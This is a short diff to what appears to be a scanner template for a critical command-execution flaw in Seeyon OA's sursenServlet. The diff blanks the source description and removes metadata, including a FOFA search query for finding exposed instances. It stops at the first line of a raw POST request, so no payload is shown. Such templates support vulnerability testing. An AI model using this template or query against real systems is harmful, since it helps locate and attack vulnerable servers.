@@ -3,12 +3,8 @@ info:
   name: 致远互联OA sursenServlet存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uw6l0mrut8gryn1k'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uw6l0mrut8gryn1k
-    fofa: app="致远互联-OA"
 http:
 - raw:
   - 'POST /seeyon/sursenServlet HTTP/1.1
